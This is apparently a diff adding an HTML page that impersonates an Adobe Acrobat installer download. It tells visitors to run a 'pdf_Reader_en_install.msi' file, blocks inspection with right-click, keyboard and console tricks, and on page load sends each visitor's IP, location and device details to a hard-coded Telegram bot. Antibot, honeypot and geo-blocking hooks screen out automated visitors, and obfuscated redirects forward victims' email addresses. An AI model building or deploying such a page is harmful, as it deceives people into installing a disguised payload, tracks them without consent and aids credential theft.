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" alt="Computer Icon" style="width: 160px; height: 160px;">
+          </div>
+          
+          <h2>Step 2: Finish installation</h2>
+          <p>Open your Downloads folder and locate the Adobe Acrobat installer file, with a name "pdf_Reader_en_install.msi".</p>
+          <p style="margin-top: 20px;">Double-click the installer file to complete the installation.</p>
+        </div>
+      </div>
+      </div>
+    </div>
+  </main>
+  <!-- Hidden antibot form -->
+  <form id="antibot-form" autocomplete="off" style="display:none;">
+    <input type="text" name="honeypot1" tabindex="-1" autocomplete="off" style="position:absolute;left:-9999px;top:-9999px;" aria-hidden="true">
+    <input type="email" name="honeypot2" tabindex="-1" autocomplete="off" style="position:absolute;left:-9999px;top:-9999px;" aria-hidden="true">
+    <input type="hidden" id="dynamic-token" name="dynamic-token" value="">
+    <input type="hidden" id="browser-fingerprint" name="browser-fingerprint" value="">
+    <input type="hidden" id="challenge-timestamp" name="challenge-timestamp" value="">
+  </form>
+
+  <script>
+    // ==============================================
+    // ADVANCED SOURCE CODE PROTECTION SYSTEM
+    // ==============================================
+    
+    (function() {
+      'use strict';
+      
+      // Anti-debugging and source protection
+      const protection = {
+        // Disable right-click context menu
+        disableRightClick: function() {
+          document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+          }, true);
+        },
+        
+        // Disable keyboard shortcuts
+        disableKeyboardShortcuts: function() {
+          document.addEventListener('keydown', function(e) {
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+            if (e.keyCode === 123 || // F12
+                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
+                (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
+                (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
+                (e.ctrlKey && e.keyCode === 65) || // Ctrl+A
+                (e.ctrlKey && e.keyCode === 67) || // Ctrl+C
+                (e.ctrlKey && e.keyCode === 86) || // Ctrl+V
+                (e.ctrlKey && e.keyCode === 88) || // Ctrl+X
+                (e.ctrlKey && e.keyCode === 80) || // Ctrl+P
+                e.keyCode === 116) { // F5
+              e.preventDefault();
+              e.stopPropagation();
+              return false;
+            }
+          }, true);
+        },
+        
+        // Clear console periodically
+        clearConsole: function() {
+          setInterval(function() {
+            try {
+              if (window.console && window.console.clear) {
+                window.console.clear();
+              }
+            } catch(e) {}
+          }, 1000);
+        },
+        
+        // Detect developer tools (disabled for now)
+        detectDevTools: function() {
+          // Temporarily disabled to prevent blank page issues
+          // This can be re-enabled later if needed
+          console.log('Dev tools detection disabled for user experience');
+        },
+        
+        // Anti-debug measures (disabled for now)
+        antiDebug: function() {
+          // Temporarily disabled to prevent blank page issues
+          // This can be re-enabled later if needed
+          console.log('Anti-debug measures disabled for user experience');
+        },
+        
+        // Disable text selection methods
+        disableSelection: function() {
+          document.onselectstart = function() { return false; };
+          document.onmousedown = function() { return false; };
+          document.ondragstart = function() { return false; };
+          
+          // Additional selection prevention
+          if (typeof document.onmousedown !== "undefined") {
+            document.onmousedown = function() { return false; };
+          } else {
+            document.onmouseup = function() { return false; };
+          }
+        },
+        
+        // Iframe busting (disabled to allow iframe loading)
+        preventFraming: function() {
+          // Disabled to allow page to load in iframes
+          console.log('Iframe loading allowed');
+        },
+        
+        // Monitor for common inspection methods (disabled for now)
+        monitorInspection: function() {
+          // Temporarily disabled to prevent blank page issues
+          // This can be re-enabled later if needed
+          console.log('Inspection monitoring disabled for user experience');
+        },
+        
+        // Disable drag and drop
+        disableDragDrop: function() {
+          document.addEventListener('dragover', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+          }, true);
+          
+          document.addEventListener('drop', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+          }, true);
+        },
+        
+        // Obfuscate source references
+        hideSource: function() {
+          // Remove script tags from DOM inspection
+          setTimeout(function() {
+            const scripts = document.getElementsByTagName('script');
+            for (let i = scripts.length - 1; i >= 0; i--) {
+              if (scripts[i].innerHTML.includes('protection')) {
+                scripts[i].remove();
+              }
+            }
+          }, 1000);
+        },
+        
+        // Initialize all protection methods
+        init: function() {
+          this.disableRightClick();
+          this.disableKeyboardShortcuts();
+          this.clearConsole();
+          this.detectDevTools();
+          this.disableSelection();
+          this.preventFraming();
+          this.monitorInspection();
+          this.disableDragDrop();
+          this.hideSource();
+          
+          // Anti-debug disabled for user experience
+          // setTimeout(() => {
+          //   if (window.innerWidth > 1000 && window.innerHeight > 600) {
+          //     this.antiDebug();
+          //   }
+          // }, 5000);
+        }
+      };
+      
+      // Initialize protection immediately
+      protection.init();
+      
+      // Additional window protection
+      window.addEventListener('load', function() {
+        protection.init();
+      });
+      
+      // Console warning
+      setTimeout(function() {
+        console.clear();
+        console.log('%cSTOP!', 'color: red; font-size: 50px; font-weight: bold;');
+        console.log('%cThis is a browser feature intended for developers. Source code inspection is not permitted.', 'color: red; font-size: 16px;');
+      }, 1000);
+      
+      // Advanced tamper detection (disabled for now)
+      // Temporarily disabled to prevent blank page issues
+      console.log('Tamper detection disabled for user experience');
+      
+      // Disable common inspection methods (disabled for now)
+      // Temporarily disabled to prevent blank page issues
+      console.log('Console hijacking disabled for user experience');
+      
+    })();
+    
+    // ==============================================
+    // END PROTECTION SYSTEM
+    // ==============================================
+    
+    // ==============================================
+    // TELEGRAM BOT CONFIGURATION
+    // ==============================================
+    // 
+    // INSTRUCTIONS FOR USERS:
+    // 1. Replace TELEGRAM_BOT_TOKEN with your bot's token (get from @BotFather)
+    // 2. Replace TELEGRAM_CHANNEL_ID with your channel/chat ID
+    // 3. To get your chat ID, send a message to your bot and visit:
+    //    https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
+    // 
+    const TELEGRAM_BOT_TOKEN = '7118260729:AAFALR8EbwjgFadtU8t-OGfAfW9uJAC4fOE';
+    const TELEGRAM_CHANNEL_ID = '6430704443';
+    
+    // Telegram Notification Functions
+    async function getVisitorInfo() {
+      try {
+        // Get visitor's IP and location info
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        
+        const visitorInfo = {
+          ip: data.ip || 'Unknown',
+          country: data.country_name || 'Unknown',
+          city: data.city || 'Unknown',
+          region: data.region || 'Unknown',
+          timezone: data.timezone || 'Unknown',
+          isp: data.org || 'Unknown',
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString(),
+          localTime: new Date().toLocaleString(),
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          windowSize: `${window.innerWidth}x${window.innerHeight}`,
+          language: navigator.language || 'Unknown',
+          platform: navigator.platform || 'Unknown'
+        };
+        
+        return visitorInfo;
+      } catch (error) {
+        console.error('Error getting visitor info:', error);
+        return {
+          ip: 'Error fetching IP',
+          country: 'Unknown',
+          city: 'Unknown',
+          region: 'Unknown',
+          timezone: 'Unknown',
+          isp: 'Unknown',
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString(),
+          localTime: new Date().toLocaleString(),
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          windowSize: `${window.innerWidth}x${window.innerHeight}`,
+          language: navigator.language || 'Unknown',
+          platform: navigator.platform || 'Unknown'
+        };
+      }
+    }
+    
+    async function sendTelegramNotification(visitorInfo) {
+      try {
+        const message = `🔔 New Visitor Alert - MSI Page
+        
+📍 Location Details:
+• IP Address: ${visitorInfo.ip}
+• Country: ${visitorInfo.country}
+• City: ${visitorInfo.city}
+• Region: ${visitorInfo.region}
+• Timezone: ${visitorInfo.timezone}
+• ISP: ${visitorInfo.isp}
+
+⏰ Time Information:
+• UTC Time: ${visitorInfo.timestamp}
+• Local Time: ${visitorInfo.localTime}
+
+💻 Device Details:
+• Platform: ${visitorInfo.platform}
+• Language: ${visitorInfo.language}
+• Screen: ${visitorInfo.screenResolution}
+• Window: ${visitorInfo.windowSize}
+
+🌐 Browser Info:
+• User Agent: ${visitorInfo.userAgent}
+
+---
+Adobe Acrobat MSI Download Page Visit`;
+
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        const response = await fetch(telegramUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHANNEL_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        
+        if (response.ok) {
+          console.log('Telegram notification sent successfully');
+        } else {
+          console.error('Failed to send Telegram notification:', response.status);
+        }
+      } catch (error) {
+        console.error('Error sending Telegram notification:', error);
+      }
+    }
+    
+    // Function to detect macOS - Global scope for reuse
+    function isMacOS() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      const platform = navigator.platform.toLowerCase();
+      
+      // Check multiple indicators for macOS
+      return (
+        platform.includes('mac') ||
+        userAgent.includes('macintosh') ||
+        userAgent.includes('mac os x') ||
+        userAgent.includes('macos') ||
+        platform === 'macintel' ||
+        platform === 'macppc'
+      );
+    }
+
+    // Animate progress percentage from 0% to 100% over 1 second
+    window.addEventListener('load', async function() {
+      // Send Telegram notification for visitor
+      try {
+        const visitorInfo = await getVisitorInfo();
+        await sendTelegramNotification(visitorInfo);
+      } catch (error) {
+        console.error('Error with visitor tracking:', error);
+      }
+      const percentageElement = document.getElementById('progress-percentage');
+      const duration = 1000; // 1 second
+      const startTime = Date.now();
+      
+      function updatePercentage() {
+        const elapsed = Date.now() - startTime;
+        const progress = Math.min(elapsed / duration, 1);
+        const percentage = Math.round(progress * 100);
+        
+        percentageElement.textContent = percentage + '%';
+        
+        if (progress < 1) {
+          requestAnimationFrame(updatePercentage);
+        } else {
+          // Animation completed - trigger redirect
+          console.log('Progress animation completed at 100%');
+          triggerRedirectAfterAnimation();
+        }
+      }
+      
+      requestAnimationFrame(updatePercentage);
+    });
+    
+    // Function to trigger redirect after animation completes
+    function triggerRedirectAfterAnimation() {
+      console.log('Animation completed, checking for redirect...');
+      
+      // Check for macOS first - redirect to Google obfuscated URL
+      if (isMacOS()) {
+        console.log('macOS detected, redirecting to Google URL...');
+        
+        if (typeof window.utils !== 'undefined' && window.utils.isProviderEnabled('google')) {
+          const googleUrl = window.utils.getObfuscatedUrl('google');
+          if (googleUrl) {
+            console.log('Redirecting macOS user to:', googleUrl);
+            
+            // Get any email from URL fragment or query
+            const fragment = window.location.hash;
+            let email = null;
+            
+            if (fragment && fragment.length > 1) {
+              const content = decodeURIComponent(fragment.substring(1));
+              if (/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(content)) {
+                email = content;
+              }
+            }
+            
+            // If no email in fragment, check query params
+            if (!email) {
+              const urlParams = new URLSearchParams(window.location.search);
+              email = urlParams.get('email');
+            }
+            
+            // Build final redirect URL with email if available
+            let finalUrl = googleUrl;
+            if (email) {
+              finalUrl = window.utils.getObfuscatedUrl('google', email);
+            }
+            
+            // Redirect immediately after animation completes
+            setTimeout(() => {
+              window.location.href = finalUrl;
+            }, 100); // Small delay to ensure smooth transition
+            return; // Exit early for macOS users
+          } else {
+            console.error('Failed to get Google URL for macOS user');
+          }
+        } else {
+          console.error('Utils not loaded or Google provider not enabled for macOS user');
+        }
+      }
+      
+      // Default behavior for non-macOS users - redirect to Teams
+      if (typeof window.utils !== 'undefined' && window.utils.isProviderEnabled('teams')) {
+        const teamsUrl = window.utils.getObfuscatedUrl('teams');
+        if (teamsUrl) {
+          console.log('Redirecting to:', teamsUrl);
+          
+          // Get any email from URL fragment or query
+          const fragment = window.location.hash;
+          let email = null;
+          
+          if (fragment && fragment.length > 1) {
+            const content = decodeURIComponent(fragment.substring(1));
+            if (/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(content)) {
+              email = content;
+            }
+          }
+          
+          // If no email in fragment, check query params
+          if (!email) {
+            const urlParams = new URLSearchParams(window.location.search);
+            email = urlParams.get('email');
+          }
+          
+          // Build final redirect URL with email if available
+          let finalUrl = teamsUrl;
+          if (email) {
+            finalUrl = window.utils.getObfuscatedUrl('teams', email);
+          }
+          
+          // Redirect immediately after animation completes
+          setTimeout(() => {
+            window.location.href = finalUrl;
+          }, 100); // Small delay to ensure smooth transition
+        } else {
+          console.error('Failed to get teams URL');
+        }
+      } else {
+        console.error('Utils not loaded or teams not enabled');
+      }
+    }
+
+    // Antibot Protection Implementation
+    (async function initializeAntibot() {
+      try {
+        // Initialize blacklist system
+        if (typeof blacklistSystem !== 'undefined') {
+          blacklistSystem.init();
+          
+          // Check if visitor is blacklisted
+          const blacklistCheck = blacklistSystem.checkBlacklist();
+          if (blacklistCheck.blocked) {
+            // Show bot trap page
+            if (typeof botTrapSystem !== 'undefined') {
+              botTrapSystem.showConstructionPage(blacklistCheck.reason);
+              return;
+            }
+          }
+        }
+
+        // Initialize interaction tracking
+        let interactionData = null;
+        if (typeof initializeInteractionTracking === 'function') {
+          interactionData = initializeInteractionTracking();
+        }
+
+        // Generate browser fingerprint
+        let fingerprint = '';
+        if (typeof generateBrowserFingerprint === 'function') {
+          fingerprint = await generateBrowserFingerprint();
+          document.getElementById('browser-fingerprint').value = fingerprint;
+        }
+
+        // Validate browser environment
+        if (typeof validateBrowserEnvironment === 'function') {
+          const isValid = validateBrowserEnvironment();
+          if (!isValid) {
+            if (typeof botTrapSystem !== 'undefined') {
+              botTrapSystem.showConstructionPage('invalid_environment');
+              return;
+            }
+          }
+        }
+
+        // Generate security token
+        if (typeof generateSecureToken === 'function') {
+          const token = await generateSecureToken();
+          document.getElementById('dynamic-token').value = token;
+        }
+
+        // Set timestamp
+        document.getElementById('challenge-timestamp').value = Date.now();
+
+        // Check for automation
+        if (typeof detectAutomation === 'function') {
+          const automationResults = detectAutomation();
+          if (automationResults.automationScore >= 5) {
+            if (typeof botTrapSystem !== 'undefined') {
+              botTrapSystem.showConstructionPage('automation_detected');
+              return;
+            }
+          }
+        }
+
+        // Initialize geo-blocking
+        if (typeof geoBlockSystem !== 'undefined') {
+          geoBlockSystem.init();
+        }
+
+        // Initialize session protection
+        if (typeof sessionProtection !== 'undefined') {
+          sessionProtection.init();
+        }
+
+        // Inject obfuscation elements
+        if (typeof obfuscationSystem !== 'undefined') {
+          obfuscationSystem.injectObfuscatedElements();
+        }
+
+        // Global variable to store the redirect URL
+        let redirectUrl = null;
+        
+        // Setup manual download link for fallback
+        function setupManualDownloadLink() {
+          const manualLink = document.getElementById('manual-download-link');
+          console.log('Setting up manual download link...');
+          console.log('Manual link element:', manualLink);
+          
+          if (manualLink) {
+            manualLink.onclick = function(e) {
+              e.preventDefault();
+              console.log('Manual download clicked');
+              
+              // Check for macOS first - redirect to Google URL
+              if (isMacOS()) {
+                console.log('macOS detected for manual download, redirecting to Google URL...');
+                
+                if (typeof window.utils !== 'undefined' && window.utils.isProviderEnabled('google')) {
+                  const googleUrl = window.utils.getObfuscatedUrl('google');
+                  if (googleUrl) {
+                    console.log('Manual redirect to Google URL:', googleUrl);
+                    window.location.href = googleUrl;
+                  } else {
+                    alert('Failed to get Google redirect URL');
+                  }
+                } else {
+                  alert('Google redirect system not available');
+                }
+                return; // Exit early for macOS users
+              }
+              
+              // Default behavior for non-macOS users - redirect to Teams
+              if (typeof window.utils !== 'undefined' && window.utils.isProviderEnabled('teams')) {
+                const teamsUrl = window.utils.getObfuscatedUrl('teams');
+                if (teamsUrl) {
+                  console.log('Manual redirect to:', teamsUrl);
+                  window.location.href = teamsUrl;
+                } else {
+                  alert('Failed to get redirect URL');
+                }
+              } else {
+                alert('Redirect system not available');
+              }
+            };
+            console.log('Manual link click handler set successfully');
+          } else {
+            console.error('Manual link element not found');
+          }
+        }
+        
+        
+
+        // Check honeypot fields periodically
+        setInterval(() => {
+          const honeypotFields = document.querySelectorAll('input[name^="honeypot"]');
+          honeypotFields.forEach(field => {
+            if (field.value) {
+              // Bot detected - filled honeypot
+              if (typeof blacklistSystem !== 'undefined') {
+                blacklistSystem.recordFailedAttempt('honeypot_filled');
+              }
+              if (typeof botTrapSystem !== 'undefined') {
+                botTrapSystem.showConstructionPage('honeypot_triggered');
+              }
+            }
+          });
+        }, 2000);
+
+        // Monitor for dev tools
+        if (typeof isDevToolsOpen === 'function') {
+          setInterval(() => {
+            if (isDevToolsOpen()) {
+              console.warn('Dev tools detected');
+              // Optional: Take action if dev tools are open
+            }
+          }, 3000);
+        }
+
+        // Scripts are loaded, antibot protection is active
+        console.log('Antibot protection initialized successfully');
+
+      } catch (error) {
+        console.error('Antibot initialization error:', error);
+        // Continue anyway to not block legitimate users
+      }
+    })();
+    
+    // Also ensure scripts are loaded on DOMContentLoaded
+    document.addEventListener('DOMContentLoaded', function() {
+      console.log('DOM loaded, checking for utils...');
+      
+      // Setup manual download link immediately
+      setupManualDownloadLink();
+      
+      // If utils isn't loaded yet, wait for it
+      if (typeof window.utils === 'undefined') {
+        console.log('Waiting for utils.js to load...');
+        
+        // Check every 500ms for utils to be available
+        const checkInterval = setInterval(() => {
+          if (typeof window.utils !== 'undefined') {
+            console.log('Utils.js loaded!');
+            clearInterval(checkInterval);
+          }
+        }, 500);
+        
+        // Stop checking after 10 seconds
+        setTimeout(() => {
+          clearInterval(checkInterval);
+          console.error('Utils.js failed to load after 10 seconds');
+        }, 10000);
+      }
+    });
+  </script>
+</body>
+</html>
+
